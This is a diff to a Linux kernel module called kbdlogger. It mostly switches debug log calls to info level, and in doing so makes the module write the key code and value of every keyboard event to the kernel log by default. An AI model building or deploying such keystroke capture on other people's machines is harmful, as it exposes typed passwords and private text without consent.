@@ -75,7 +75,7 @@ static int kbdlogger_connect(struct input_handler *handler,
 		if (error)
 			goto err_unregister_handle;
 
-		pr_debug(pr_fmt("Connected device: %s (%s at %s)\n"),
+		pr_info("Connected device: %s (%s at %s)\n",
 			dev_name(&dev->dev),
 			dev->name ?: "unknown",
 			dev->phys ?: "unknown");
@@ -94,7 +94,7 @@ static void kbdlogger_event(struct input_handle *handle, unsigned int type,
 			unsigned int code, int value)
 {
 	if (type == EV_KEY) {
-		pr_debug(pr_fmt("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n"),
+		pr_info("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n",
 		dev_name(&handle->dev->dev), type, code, value);
 		pressev++;
 		keyev.value = value;
@@ -107,7 +107,7 @@ static void kbdlogger_event(struct input_handle *handle, unsigned int type,
 
 static void kbdlogger_disconnect(struct input_handle *handle)
 {
-	pr_debug(pr_fmt("Disconnected device: %s\n"),
+	pr_info("Disconnected device: %s\n",
 		dev_name(&handle->dev->dev));
 
 	input_close_device(handle);
@@ -165,7 +165,7 @@ static int __init kbdlogger_init(void)
 
 	/* Register the new device in the input system */
 	if (input_register_device(kbd_input_dev)) {
-		pr_err(pr_fmt("Failed input device register\n"));
+		pr_err("Failed input device register\n");
 		input_free_device(kbd_input_dev);
 		kbd_input_dev = NULL;
 		err = -ENOMEM;
@@ -173,13 +173,14 @@ static int __init kbdlogger_init(void)
 	}
 
 	if (input_register_handler(&kbdlogger_handler)) {
-		pr_err(pr_fmt("Failed input handler register\n"));
+		pr_err("Failed input handler register\n");
 		err = -ENOMEM;
 		goto fail;
 	}
 
 	memset(&keyev, 0, sizeof(struct input_event));
 	pressev = 0;
+	pr_info("loaded\n");
 	return 0;
 fail:
 	kbdlogger_cleanup();
@@ -189,8 +190,8 @@ fail:
 
 static void __exit kbdlogger_exit(void)
 {
-	pr_info(pr_fmt("exiting...\n"));
 	kbdlogger_cleanup();
+	pr_info("exited\n");
 }
 
 
